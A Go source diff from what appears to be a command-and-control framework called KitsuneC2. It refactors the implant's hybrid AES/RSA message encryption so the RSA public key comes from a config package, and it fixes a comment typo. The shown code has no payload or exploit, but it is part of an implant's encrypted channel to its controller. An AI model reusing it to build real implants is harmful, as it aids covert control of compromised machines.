@@ -1,6 +1,7 @@
 package main
 
 import (
+	"KitsuneC2/implant/config"
 	"KitsuneC2/lib/communication"
 	"KitsuneC2/lib/cryptography"
 	"bytes"
@@ -11,16 +12,12 @@ import (
 	"reflect"
 )
 
-const (
-	publicKey string = "MIIBCgKCAQEApBu0qZ45NuQ5WQ1TAtnKR45Joj3JvaT+umIOysCiUXB+IOs7cUjY1Pqmnt61x78+gBV+jBI5eQIPO9ZaAtxLlBjFAZza8YvMgUr4csqMC1yn/hBi7O80qhROE+7XCwCsn8snfCvjX72wQ7YbcEuPs4vLU+loVPyjyTBvnvgpveciozDK0xpVLt9fdMgmJn5VgvIG+5VleVve2PSrZinOGng8FvjsGV0gvQ6NbUyylyF4Ncov/nNYr9d39UJpSK6pTIA/GysE4V8IMO2tlccbo7ovNqulPCr2BYFxktaUolkw1wZ5TeNvxZ/NodHIxzTArVEt8cJqR98XjwdAYuYYpwIDAQAB"
-)
-
 var (
 	sessionKey []byte //generated randomly on each "SendEnvelopeToServer" call
 )
 
 // generates new 256-bit AES sessionKey, and encrypts the envelope datastructure with it. Then it encrypts the generated AES key
-// using an RSA public key. The encryptes AES-key + encrypted envelope get sent over the wire as follows:
+// using an RSA public key. The encrypted AES-key + encrypted envelope get sent over the wire as follows:
 // Message = uint32(message length) - uint32(encryptedAESkey length) - encryptesAESkey - encryptedEnvelope
 func SendEnvelopeToServer(connection net.Conn, messageType int, data interface{}) error {
 	newSessionKey := cryptography.GenerateRandomBytes(32) //generate new sessionKey
@@ -29,7 +26,7 @@ func SendEnvelopeToServer(connection net.Conn, messageType int, data interface{}
 		return err
 	}
 
-	pubKey, err := cryptography.StringToRsaPublicKey(publicKey)
+	pubKey, err := cryptography.StringToRsaPublicKey(config.PublicKey)
 	if err != nil {
 		return err
 	}
